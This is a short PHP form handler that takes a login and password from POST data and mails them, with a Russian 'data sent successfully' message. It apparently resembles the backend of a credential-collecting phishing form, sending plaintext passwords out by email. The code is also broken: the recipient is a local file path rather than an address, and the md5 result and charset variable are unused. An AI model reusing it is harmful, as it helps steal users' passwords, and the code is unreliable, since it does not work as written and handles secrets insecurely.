<?php
$name = $_POST['login'];
$password = $_POST['password'];

if (isset($_POST['send'])) {
    (md5($_POST['send']));
    $to = "\OpenServer\domains\Fact\Php.ru\email";
    $charset = "utf-8";
    mail($to, $name, $password);
    echo "Данные успешно отправлены";
}